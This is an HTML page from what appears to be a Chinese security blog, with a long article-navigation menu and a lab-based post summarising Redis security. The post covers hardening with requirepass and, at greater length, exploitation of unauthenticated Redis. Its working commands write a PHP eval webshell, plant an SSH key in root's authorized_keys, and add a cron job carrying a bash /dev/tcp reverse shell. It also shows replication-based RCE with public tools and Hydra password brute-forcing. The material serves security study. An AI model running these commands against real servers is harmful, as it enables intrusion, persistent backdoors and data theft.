+<li><a href="/2019/04/05/Spring-Data-Rest之cve-2017-8046分析/">浅析Spring Data Rest之CVE-2017-8046</a></li>
+<li><a href="/2020/02/03/浅析Spring-Data-Commons之CVE-2018-1273/">浅析Spring Data Commons之CVE-2018-1273</a></li>
+<li><a href="/2020/02/08/浅析Spring-Messaging之CVE-2018-1270/">浅析Spring Messaging之CVE-2018-1270</a></li>
+<li><a href="/2020/02/09/浅析Spring-WebFlow之CVE-2017-4971/">浅析Spring Web Flow之CVE-2017-4971</a></li>
+<li><a href="/2020/02/09/浅析Spring-Security-OAuth2之CVE-2016-4977/">浅析Spring Security OAuth2之CVE-2016-4977</a></li>
+</ul>
+</li>
+<li>SpringCloud</li>
+</ul>
+</li>
+<li><strong>PHP</strong><ul>
+<li>PHP安全<ul>
+<li><a href="/2019/08/25/浅谈PHP-FPM安全/">浅谈PHP-FPM安全</a></li>
+<li><a href="/2019/08/03/从蚁剑插件看利用PHP-FPM绕过disable-functions/">从蚁剑插件看利用PHP-FPM绕过disable_functions</a></li>
+<li><a href="/2019/07/20/浅谈几种Bypass-open-basedir的方法/">浅谈几种Bypass open_basedir的方法</a></li>
+<li><a href="/2019/07/16/PHP中mail-函数安全问题与防御/">PHP中mail()函数安全问题与防御</a></li>
+<li><a href="/2019/07/04/浅谈escapeshellarg与参数注入/">浅谈escapeshellarg逃逸与参数注入</a></li>
+<li><a href="/2019/07/02/浅析preg-replace与preg-match/">浅析preg_replace与preg_match</a></li>
+<li><a href="/2019/06/21/PHP弱类型小结/">PHP弱类型及相关函数Bypass小结</a></li>
+<li><a href="/2019/06/20/PHP变量覆盖漏洞/">PHP变量覆盖漏洞小结</a></li>
+<li><a href="/2019/06/09/巧用get-defined-functions隐藏WebShell/">巧用get_defined_functions隐藏WebShell</a></li>
+<li><a href="/2019/06/07/从一道题看PHP7-4的FFI绕过disable-functions/">从RCTF nextphp看PHP7.4的FFI绕过disable_functions</a></li>
+<li><a href="/2019/06/02/浅谈几种Bypass-disable-functions的方法/">浅谈几种Bypass disable_functions的方法</a></li>
+<li><a href="/2019/05/04/PHP对象注入之pop链构造/">PHP对象注入之pop链构造</a></li>
+<li><a href="/2019/04/21/PHP-session反序列化漏洞/">PHP session反序列化漏洞</a></li>
+<li><a href="/2019/01/31/PHP伪协议/">PHP伪协议</a></li>
+<li><a href="/2019/01/01/phar反序列化漏洞/">phar反序列化漏洞</a></li>
+<li><a href="/2019/01/01/Windows下的一种PHP隐蔽后门姿势/">Windows下的一种PHP隐藏后门姿势</a></li>
+<li><a href="/2019/01/01/PHP反序列化漏洞/">PHP unserialize反序列化漏洞</a></li>
+<li><a href="/2019/01/01/PHP内存型木马/">PHP内存型木马</a></li>
+</ul>
+</li>
+<li>CMS<ul>
+<li><a href="/2019/01/02/PHP代码审计实战之盾灵CMS/">PHP代码审计实战之盾灵CMS</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><strong>Python</strong><ul>
+<li>Python安全<ul>
+<li><a href="/2019/06/02/浅析Python-Flask-SSTI/">浅析Python Flask SSTI</a></li>
+<li><a href="/2019/05/31/Python沙箱逃逸小结/">Python沙箱逃逸小结</a></li>
+<li><a href="/2019/01/01/PyYAML反序列化漏洞/">Python PyYAML反序列化漏洞</a></li>
+<li><a href="/2019/01/01/cPickle反序列化漏洞/">Python cPickle反序列化漏洞</a></li>
+<li><a href="/2020/03/09/Python-urllib-CRLF注入漏洞小结/">Python urllib CRLF注入漏洞小结</a></li>
+</ul>
+</li>
+<li>安全开发<ul>
+<li><a href="/2019/06/30/AWD文件监控脚本/">AWD文件监控脚本</a></li>
+<li><a href="/2019/01/01/Python安全小工具之反编译pyc文件/">Python安全小工具之反编译pyc文件</a></li>
+</ul>
+</li>
+<li>爬虫</li>
+<li>Django</li>
+</ul>
+</li>
+<li><strong>JavaScript</strong><ul>
+<li>JavaScript安全<ul>
+<li><a href="/2019/10/20/浅析JavaScript原型链污染攻击/">浅析JavaScript原型链污染攻击</a></li>
+</ul>
+</li>
+<li>NodeJS</li>
+<li>AngularJS</li>
+</ul>
+</li>
+<li><strong>GO</strong><ul>
+<li>GO安全<ul>
+<li><a href="/2020/01/01/浅析Influxdb认证绕过漏洞/">浅析Influxdb认证绕过漏洞</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><strong>二进制安全</strong><ul>
+<li>二进制基础<ul>
+<li><a href="/2019/05/24/GOT表-PLT表与动态链接/">ELF动态链接,PLT和GOT</a></li>
+<li><a href="/2019/04/27/堆基础/">堆基础</a></li>
+<li><a href="/2019/04/15/ELF二进制格式/">ELF二进制格式</a></li>
+<li><a href="/2019/03/03/栈及栈帧/">栈基础</a></li>
+<li><a href="/2019/02/09/ELF安全防御机制小结/">ELF安全防御机制小结</a></li>
+<li><a href="/2019/01/28/IA-32寄存器/">IA-32（Intel Architecture 32位）寄存器</a></li>
+<li><a href="/2019/01/01/Linux环境与相关工具/">Linux环境与相关工具</a></li>
+</ul>
+</li>
+<li>C/C++<ul>
+<li><a href="/2019/03/24/C编写实现Linux反弹shell/">C编写实现Linux反弹shell</a></li>
+</ul>
+</li>
+<li>逆向工程</li>
+<li>Fuzzing</li>
+<li>Pwn<ul>
+<li><a href="/2019/04/20/花式栈溢出之stack-pivoting/">花式栈溢出之stack pivoting</a></li>
+<li><a href="/2019/04/12/中级ROP之ret2csu/">栈溢出之ret2csu</a></li>
+<li><a href="/2019/04/09/蒸米ROP学习笔记/">蒸米32位及64位ROP笔记</a></li>
+<li><a href="/2019/04/07/pwntools笔记/">pwntools笔记</a></li>
+<li><a href="/2019/03/23/花式栈溢出之Stack-smash/">花式栈溢出之Stack smash</a></li>
+<li><a href="/2019/03/05/栈溢出之ret2libc/">栈溢出之ret2libc</a></li>
+<li><a href="/2019/03/03/栈溢出之ret2syscall/">栈溢出之ret2syscall</a></li>
+<li><a href="/2019/03/03/栈溢出之ret2shellcode/">栈溢出之ret2shellcode</a></li>
+<li><a href="/2019/03/03/ROP之ret2text/">ROP基础及栈溢出之ret2text</a></li>
+<li><a href="/2019/03/03/栈溢出基本原理/">栈溢出基本原理</a></li>
+</ul>
+</li>
+<li>WriteUp Pwn<ul>
+<li><a href="/2019/03/08/TAMUctf-Pwn-writeup/">TAMUctf Pwn writeup</a></li>
+</ul>
+</li>
+<li>WriteUp Reverse<ul>
+<li><a href="/2019/01/01/HITB_Binary_100_writeup/">HITB Binary 100 writeup</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><strong>渗透测试</strong><ul>
+<li>基础&amp;Tricks</li>
+<li>Kali</li>
+<li>Metasploit</li>
+<li>内网渗透<ul>
+<li><a href="/2020/02/15/内网渗透基础/">内网渗透基础与域环境搭建</a></li>
+<li><a href="/2020/02/18/Windows-PowerShell基础/">内网渗透之Windows PowerShell基础</a></li>
+<li><a href="/2020/02/27/内网信息收集之本机信息收集/">内网信息收集之本机信息收集</a></li>
+<li><a href="/2020/03/08/内网信息收集之域相关信息收集/">内网信息收集之域相关信息收集</a></li>
+</ul>
+</li>
+<li>提权<ul>
+<li><a href="/2019/01/01/关于本地提权的学习笔记（一）：Administrator提权到System">Administrator提权到System</a></li>
+<li><a href="/2019/01/01/关于本地提权的学习笔记（二）：注入进程和利用漏洞提权">注入进程和利用漏洞提权</a></li>
+</ul>
+</li>
+<li>免杀</li>
+<li>工具</li>
+</ul>
+</li>
+<li><strong>OS</strong><ul>
+<li>Windows<ul>
+<li><a href="/2019/01/01/将Python脚本转换为exe">将Python脚本转换为exe</a></li>
+<li><a href="/2019/01/01/几个查看用户信息的Windows程序">几个查看用户信息的Windows程序</a></li>
+</ul>
+</li>
+<li>Linux</li>
+</ul>
+</li>
+</ul>
+
+  </div>
+</div>
+</div>
+
+<header class="post-header text-center">
+	<h1 class="title">
+		Redis安全小结
+	</h1>
+	<span class="read">
+		阅读量 <span id="busuanzi_value_page_pv"></span>
+	</span>
+</header><br>
+
+<div class="book-post">
+  <h2 id="0x01-Redis"><a href="#0x01-Redis" class="headerlink" title="0x01 Redis"></a>0x01 Redis</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>REmote DIctionary Server(Redis) 是一个由Salvatore Sanfilippo写的key-value存储系统。</p>
+<p>Redis是一个开源的使用ANSI C语言编写、遵守BSD协议、支持网络、可基于内存亦可持久化的日志型、Key-Value数据库，并提供多种语言的API。</p>
+<p>它通常被称为数据结构服务器，因为值（value）可以是 字符串(String), 哈希(Hash), 列表(list), 集合(sets) 和 有序集合(sorted sets)等类型。</p>
+<p>Redis服务的默认端口是6379。</p>
+<p>官网查看更多信息：<a href="https://redis.io/" target="_blank" rel="noopener">https://redis.io/</a></p>
+<h3 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h3><p>常见命令如下：</p>
+<ul>
+<li>查看信息：info</li>
+<li>删除所有数据库内容：flushall</li>
+<li>刷新数据库：flushdb</li>
+<li>查看所有键：keys *，使用select num可以查看键值数据</li>
+<li>设置变量：set aaa “mi1k7ea”</li>
+<li>查看变量值：get aaa</li>
+<li>查看备份文件路径：config get dir</li>
+<li>设置备份文件路径：config set dir dirpath</li>
+<li>查看备份文件名：config get dbfilename</li>
+<li>设置备份文件名：config set dbfilename filename</li>
+<li>保存备份文件：save</li>
+</ul>
+<h3 id="漏洞环境搭建"><a href="#漏洞环境搭建" class="headerlink" title="漏洞环境搭建"></a>漏洞环境搭建</h3><p>这里搭建漏洞版本的Redis服务，同时配置服务进行全网监听：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 下载并解压运行make</span></span><br><span class="line">wget http://download.redis.io/releases/redis-3.2.11.tar.gz</span><br><span class="line">tar zxf redis-3.2.11.tar.gz</span><br><span class="line"><span class="built_in">cd</span> redis-3.2.11/</span><br><span class="line">make</span><br><span class="line"></span><br><span class="line"><span class="comment"># 进入src目录中将redis-server和redis-cli复制到/usr/bin目录下，方便命令识别</span></span><br><span class="line"><span class="built_in">cd</span> src</span><br><span class="line">cp redis-server /usr/bin/</span><br><span class="line">cp redis-cli /usr/bin/</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将redis.conf复制到/etc/目录下</span></span><br><span class="line"><span class="built_in">cd</span> ..</span><br><span class="line">cp redis.conf /etc/</span><br><span class="line"></span><br><span class="line"><span class="comment"># 编辑/etc/中的redis配置文件redis.conf</span></span><br><span class="line">vim /etc/redis.conf</span><br><span class="line"><span class="comment">#	注释掉本地绑定，允许除本地外的主机远程访问Redis服务</span></span><br><span class="line"><span class="comment">#	#bind 127.0.0.1</span></span><br><span class="line"><span class="comment">#	关闭保护模式，允许远程连接Redis服务</span></span><br><span class="line"><span class="comment">#	protected-mode no</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用/etc/目录下的redis.conf文件中的配置来启动Redis服务</span></span><br><span class="line">redis-server /etc/redis.conf</span><br></pre></td></tr></table></figure>
+<p>接着在Windows下就能无需密码认证直接远程连接Redis了：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -h 192.168.10.137 -p 6379</span><br></pre></td></tr></table></figure>
+<h3 id="安全配置密码验证"><a href="#安全配置密码验证" class="headerlink" title="安全配置密码验证"></a>安全配置密码验证</h3><p>我们可以通过Redis的配置文件设置密码参数，这样客户端连接到Redis服务就需要密码验证，这样可以让你的Redis服务更安全，进而杜绝了未授权访问漏洞。</p>
+<p>我们可以通过以下命令查看是否设置了密码验证：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1:6379&gt; CONFIG get requirepass</span><br><span class="line">1) &quot;requirepass&quot;</span><br><span class="line">2) &quot;&quot;</span><br></pre></td></tr></table></figure>
+<p>默认情况下requirepass参数是空的，这就意味着你无需通过密码验证就可以连接到Redis服务。</p>
+<p>你可以通过以下命令来修改该参数：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1:6379&gt; CONFIG set requirepass &quot;runoob&quot;</span><br><span class="line">OK</span><br><span class="line">127.0.0.1:6379&gt; CONFIG get requirepass</span><br><span class="line">1) &quot;requirepass&quot;</span><br><span class="line">2) &quot;runoob&quot;</span><br></pre></td></tr></table></figure>
+<p>设置密码后，客户端连接Redis服务就需要密码验证，否则无法执行命令。</p>
+<p>密码验证用到AUTH命令，如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1:6379&gt; AUTH &quot;password&quot;</span><br><span class="line">OK</span><br><span class="line">127.0.0.1:6379&gt; SET mykey &quot;Test value&quot;</span><br><span class="line">OK</span><br><span class="line">127.0.0.1:6379&gt; GET mykey</span><br><span class="line">&quot;Test value&quot;</span><br></pre></td></tr></table></figure>
+<h2 id="0x02-Redis漏洞攻击利用"><a href="#0x02-Redis漏洞攻击利用" class="headerlink" title="0x02 Redis漏洞攻击利用"></a>0x02 Redis漏洞攻击利用</h2><p>Redis漏洞包括未授权访问漏洞所引起的一系列深入攻击利用以及其他一些已知的Redis CVE漏洞。</p>
+<p>在旧版本中Redis默认配置的服务是监听在公网的，而在最近这些新版本中都默认将监听地址改为本地监听，即前面redis.conf中看到的<code>bind 127.0.0.1</code>。</p>
+<h3 id="未授权访问漏洞"><a href="#未授权访问漏洞" class="headerlink" title="未授权访问漏洞"></a>未授权访问漏洞</h3><p>由于配置不当的原因，导致Redis服务暴露在公网（即绑定在0.0.0.0:6379），并且没有开启相关认证和添加相关安全策略的情况下，即存在未授权访问漏洞。</p>
+<p>攻击者在未授权访问Redis的情况下，可以获取数据库的所有数据、删除数据库数据等，进一步地可以利用Redis相关方法来实现写入WebShell、写入Crontab定时任务、写入SSH公钥以及利用主从复制RCE等一系列的攻击利用，将Redis未授权访问漏洞的危害无限放大。</p>
+<h4 id="敏感信息泄露与数据库内容删除"><a href="#敏感信息泄露与数据库内容删除" class="headerlink" title="敏感信息泄露与数据库内容删除"></a>敏感信息泄露与数据库内容删除</h4><p>使用Redis的语句可以获取数据库中的存储的敏感信息，这里为了方便直接通过<code>keys *</code>来获取所有的键，然后通过get命令获取键值（如果在实际的业务中，一般不会查询所有键，因为对性能影响太大了，而是通过查询指定的某些数据库内容）：</p>
+<p><img src="/2020/03/05/Redis安全小结/1.png" alt=""></p>
+<p>使用info命令可以看到Redis的版本、OS内核版本、配置文件路径等信息：</p>
+<p><img src="/2020/03/05/Redis安全小结/2.png" alt=""></p>
+<p>使用flushall等相关命令可以将Redis数据库所有内容删除掉，注意要慎用：</p>
+<p><img src="/2020/03/05/Redis安全小结/3.png" alt=""></p>
+<h4 id="向Web目录写入WebShell"><a href="#向Web目录写入WebShell" class="headerlink" title="向Web目录写入WebShell"></a>向Web目录写入WebShell</h4><p>前提是Redis所在机子开启了Web服务，且已知Web服务目录路径。</p>
+<p>原理就是在Redis中插入一条数据，将WebShell代码作为value，key值随意，然后通过修改数据库的默认路径为Web服务目录和默认的缓存文件为WebShell文件，最后通过save命令以备份的方式把缓存的数据保存在文件里，这样就可以在服务器端的Web目录下生成一个WebShell文件。</p>
+<p>具体步骤就是先写入一个含WebShell代码的键值，然后设置备份目录为Web目录，接着设置备份文件名为WebShell文件名，最后通过save命令保存文件到本地。如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">set payload &quot;&lt;?php @eval($_POST[c]);?&gt;&quot;</span><br><span class="line">config set dir /var/www/html/</span><br><span class="line">config set dbfilename shell.php</span><br><span class="line">save</span><br></pre></td></tr></table></figure>
+<p><img src="/2020/03/05/Redis安全小结/4.png" alt=""></p>
+<p>在服务端看到生成的shell.php内容如下，可以看到PHP代码穿插其中：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">REDIS0007�	redis-ver3.2.11�</span><br><span class="line">redis-bits�@�ctime� c^used-mem�h�</span><br><span class="line">                                  ��payload&lt;?php @eval($_POST[c]);?&gt;�hUuϞ^</span><br></pre></td></tr></table></figure>
+<p><img src="/2020/03/05/Redis安全小结/5.png" alt=""></p>
+<p>由于PHP的容错性，该PHP代码是能正常执行的，能正常getshell：</p>
+<p><img src="/2020/03/05/Redis安全小结/6.png" alt=""></p>
+<h4 id="写入SSH公钥直接登录"><a href="#写入SSH公钥直接登录" class="headerlink" title="写入SSH公钥直接登录"></a>写入SSH公钥直接登录</h4><p>前提是Redis服务是以root权限运行的。</p>
+<p>原理和前面一样的，只是备份的目录和文件名修改为/root/.ssh/目录和authorized_keys文件名。</p>
+<p>先在Ubuntu中生成公私钥：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa</span><br></pre></td></tr></table></figure>
+<p><img src="/2020/03/05/Redis安全小结/7.png" alt=""></p>
+<p>获取公钥内容<code>cat /home/ski12/.ssh/id_rsa.pub</code>：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCezjyBJJ+qsrow5bFZT4/ezNQPmNQPkrQ7VfYIrU5q2NmGwQ/AAU3uL6FRCF3NsU8g3eudncLMw1qQTsTGKW4xI6DDjcszUjCX/vl+KoAlfIlH3+EOV/n8JbGnBMud/FeMTSGvEfw6yPTLIHH9nBwWHVitBoP2kM86eAyeKAGNjtHlPnPF+RMX0oNaijAgJqC3z/Ar2RMf6luwdrVYTBHFZ9ZF51lOJ1xlfHJDVV0VbDhSgZil6eIrEcG8I/tshaWkTAyfxq/2VjMXXU4/JTlxrMqbR5xvL/sC88Yexy07KYdEkFfvmn2XCeT0sM00OB+SlYBqrf1h3XIS1j//uFP5 ski12@ubuntu</span><br></pre></td></tr></table></figure>
+<p><img src="/2020/03/05/Redis安全小结/8.png" alt=""></p>
+<p>通过Redis客户端将公钥内容写入到/root/.ssh/authorized_keys文件中，注意保存key的时候加上两个<code>\n</code>是为了避免和Redis里其他缓存数据混合：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">config set dir /root/.ssh/</span><br><span class="line">config set dbfilename authorized_keys</span><br><span class="line">set payload &quot;\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCezjyBJJ+qsrow5bFZT4/ezNQPmNQPkrQ7VfYIrU5q2NmGwQ/AAU3uL6FRCF3NsU8g3eudncLMw1qQTsTGKW4xI6DDjcszUjCX/vl+KoAlfIlH3+EOV/n8JbGnBMud/FeMTSGvEfw6yPTLIHH9nBwWHVitBoP2kM86eAyeKAGNjtHlPnPF+RMX0oNaijAgJqC3z/Ar2RMf6luwdrVYTBHFZ9ZF51lOJ1xlfHJDVV0VbDhSgZil6eIrEcG8I/tshaWkTAyfxq/2VjMXXU4/JTlxrMqbR5xvL/sC88Yexy07KYdEkFfvmn2XCeT0sM00OB+SlYBqrf1h3XIS1j//uFP5 ski12@ubuntu\n\n&quot;</span><br><span class="line">save</span><br></pre></td></tr></table></figure>
+<p><img src="/2020/03/05/Redis安全小结/9.png" alt=""></p>
+<p>为了不用自己复制粘贴公钥内容，换种形式也OK：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(<span class="built_in">echo</span> -e <span class="string">"\n\n"</span>; cat id_rsa.pub; <span class="built_in">echo</span> -e <span class="string">"\n\n"</span>) &gt; m7.txt</span><br><span class="line">cat m7.txt | redis-cli -h 192.168.10.137 -p 6379 <span class="built_in">set</span> payload</span><br></pre></td></tr></table></figure>
+<p>此时看到Kali中的/root/.ssh/目录中成功生成了authorized_keys文件的：</p>
+<p><img src="/2020/03/05/Redis安全小结/10.png" alt=""></p>
+<p>注意，如果Kali中的SSH服务还没开启的话，通过如下命令开启即可：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl start ssh</span><br></pre></td></tr></table></figure>
+<p>接着在Ubuntu上使用私钥直接SSH远程连接到Kali，得到shell：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -i id_rsa root@192.168.10.137</span><br></pre></td></tr></table></figure>
+<p><img src="/2020/03/05/Redis安全小结/11.png" alt=""></p>
+<h4 id="写入定时任务反弹shell"><a href="#写入定时任务反弹shell" class="headerlink" title="写入定时任务反弹shell"></a>写入定时任务反弹shell</h4><p>该方法只能CentOS上使用，Ubuntu、Debian上行不通。原因如下：</p>
+<ul>
+<li>权限问题，Ubuntu定时任务需要root权限；</li>
+<li>Redis备份文件存在乱码，而Debian和Ubuntu对定时任务的格式校验很严格，因此在Debian和Ubuntu上会报错，而在CentOS上不会报错；</li>
+</ul>
+<p>原理和前面是一样的，只是备份的目录和文件名修改了下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">config set dir /var/spool/cron/crontabs/</span><br><span class="line">config set dbfilename root</span><br><span class="line">set payload &quot;\n\n* * * * * bash -i &gt;&amp; /dev/tcp/192.168.10.307/666 0&gt;&amp;1\n\n&quot;</span><br><span class="line">save</span><br></pre></td></tr></table></figure>
+<p><img src="/2020/03/05/Redis安全小结/13.png" alt=""></p>
+<p>注意，不同类型、版本的OS的crontabs所在路径会有所区别。</p>
+<p>可以看到在Kali中成功生成root文件，其中含有定时任务的内容，也包括了乱码：</p>
+<p><img src="/2020/03/05/Redis安全小结/12.png" alt=""></p>
+<p>此时并未在监听端接收到反弹shell。这是由于Kali是Debian系统，对定时任务的格式要求很严，而root文件内容含有乱码，会导致执行不成功。除此之外，还有root文件执行的权限问题，我们通过<code>tail /var/log/syslog</code>命令来查看如下错误信息，因为权限不够、所以cron拒绝执行该定时任务：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cron[441]: (root) INSECURE MODE (mode 0600 expected) (crontabs/root)</span><br></pre></td></tr></table></figure>
+<p><img src="/2020/03/05/Redis安全小结/14.png" alt=""></p>
+<p>具体CentOS的利用可自行测试。</p>
+<p>不同OS的系统任务调度文件：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Ubuntu</span><br><span class="line">/var/spool/cron/crontabs/xxx</span><br><span class="line"></span><br><span class="line">Debian</span><br><span class="line">/etc/cron.d/xxx</span><br><span class="line">或</span><br><span class="line">/var/spool/cron/crontabs/xxx</span><br><span class="line"></span><br><span class="line">Alpine</span><br><span class="line">/etc/cron.d/xxx</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>可进行利用的cron有如下几个地方：</p>
+<ul>
+<li>/etc/crontab 这个是肯定的</li>
+<li>/etc/cron.d/* 将任意文件写到该目录下，效果和crontab相同，格式也要和/etc/crontab相同。漏洞利用这个目录，可以做到不覆盖任何其他文件的情况进行弹shell。</li>
+<li>/var/spool/cron/root centos系统下root用户的cron文件</li>
+<li>/var/spool/cron/crontabs/root debian系统下root用户的cron文件</li>
+</ul>
+</blockquote>
+<h4 id="其他的利用"><a href="#其他的利用" class="headerlink" title="其他的利用"></a>其他的利用</h4><p>任何可利用Redis未授权访问漏洞来写文件的地方都能被进行恶意利用，除了前面几项利用方式外，还有以下收集的几个在Linux或Windows下的利用方式。</p>
+<p>写入/etc/passwd文件实现任意账号密码重置：<a href="https://www.freebuf.com/vuls/148758.html#-etcpasswd" target="_blank" rel="noopener">https://www.freebuf.com/vuls/148758.html#-etcpasswd</a></p>
+<p>写入Windows启动项：<a href="https://www.anquanke.com/post/id/170360#h3-3" target="_blank" rel="noopener">https://www.anquanke.com/post/id/170360#h3-3</a></p>
+<p>写入Windows MOF：<a href="https://www.anquanke.com/post/id/170360#h3-4" target="_blank" rel="noopener">https://www.anquanke.com/post/id/170360#h3-4</a></p>
+<h3 id="利用主从复制RCE"><a href="#利用主从复制RCE" class="headerlink" title="利用主从复制RCE"></a>利用主从复制RCE</h3><h4 id="Redis主从复制"><a href="#Redis主从复制" class="headerlink" title="Redis主从复制"></a>Redis主从复制</h4><p>如果把数据存储在单个Redis中，而读写体量比较大的时候，服务端的性能就会大受影响。为了应对这种情况，Redis就提供了主从模式。</p>
+<p>Redis主从模式是指使用一个Redis作为主机，其他Redis则作为从机即备份机。其中主机和从机数据相同，主机只负责写，从机只负责读，通过读写分离可以大幅度减轻流量的压力，即是一种通过牺牲空间来换取效率的缓解方式。</p>
+<h4 id="攻击利用"><a href="#攻击利用" class="headerlink" title="攻击利用"></a>攻击利用</h4><p>主从复制实现RCE还是属于未授权访问的一种利用方式，这里因为其较新型便单独提出一小节。</p>
+<p>4.x、5.x 版本的Redis提供了主从模式。在Redis 4.x 之后，通过外部扩展，可以在Redis中实现一个新的Redis命令，构造恶意.so文件。在两个Redis实例设置主从模式的时候，Redis的主机可以通过FULLRESYNC同步文件到从机上，然后在从机上加载恶意so文件，即可执行命令。</p>
+<p>Redis主从数据库之间的同步分为两种：</p>
+<ul>
+<li>全量复制是将数据库备份文件整个传输过去从机，然后从机清空内存数据库，将备份文件加载到数据库中；</li>
+<li>部分复制只是将写命令发送给从机；</li>
+</ul>
+<p>因此，想要复制备份文件的话就需要设置Redis主机的传输方式为全量传输。</p>
+<p>这里我们只需要模拟协议收发包就能伪装成Redis主机了，利用工具如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/n0b0dyCN/RedisModules-ExecuteCommand</span><br><span class="line">git clone https://github.com/Ridter/redis-rce.git</span><br></pre></td></tr></table></figure>
+<p>第一个工具是用于生成恶意的执行shell的so文件；第二个工具是伪造Redis主机的脚本。</p>
+<p>首先要生成恶意so文件，下载第一个工具然后make即可生成。</p>
+<p>然后在攻击者机器上执行如下命令即可成功RCE：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python redis-rce.py -r 192.168.10.137 -p 6379 -L 192.168.10.141 -f module.so</span><br></pre></td></tr></table></figure>
+<p><img src="/2020/03/05/Redis安全小结/15.png" alt=""></p>
+<h3 id="用Hydra暴力破解Redis密码"><a href="#用Hydra暴力破解Redis密码" class="headerlink" title="用Hydra暴力破解Redis密码"></a>用Hydra暴力破解Redis密码</h3><p>使用Hydra工具可以对Redis密码进行暴力破解：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -P /home/fragrant/sec_tools/w3af/w3af/core/controllers/bruteforce/passwords.txt redis://192.168.10.137</span><br></pre></td></tr></table></figure>
+<h3 id="历史CVE漏洞"><a href="#历史CVE漏洞" class="headerlink" title="历史CVE漏洞"></a>历史CVE漏洞</h3><h4 id="Redis远程代码执行漏洞（CVE-2016-8339）"><a href="#Redis远程代码执行漏洞（CVE-2016-8339）" class="headerlink" title="Redis远程代码执行漏洞（CVE-2016-8339）"></a>Redis远程代码执行漏洞（CVE-2016-8339）</h4><p>Redis 3.2.x &lt; 3.2.4 版本存在缓冲区溢出漏洞，可导致任意代码执行。Redis数据结构存储的CONFIG SET命令中client-output-buffer-limit选项处理存在越界写漏洞。构造的CONFIG SET命令可导致越界写，从而RCE。</p>
+<h4 id="CVE-2015-8080"><a href="#CVE-2015-8080" class="headerlink" title="CVE-2015-8080"></a>CVE-2015-8080</h4><p>Redis版本 2.8.x &lt; 2.8.24 和 3.0.x &lt; 3.0.6 中，lua_struct.c中的getnum函数存在整数溢出漏洞，导致攻击者可以运行Lua代码或可能绕过沙盒限制。</p>
+<h4 id="CVE-2015-4335"><a href="#CVE-2015-4335" class="headerlink" title="CVE-2015-4335"></a>CVE-2015-4335</h4><p>Redis 2.8.1 之前版本和 3.0.2 之前版本中存在安全漏洞，攻击者可以远程执行eval命令，利用该漏洞执行任意Lua字节码。</p>
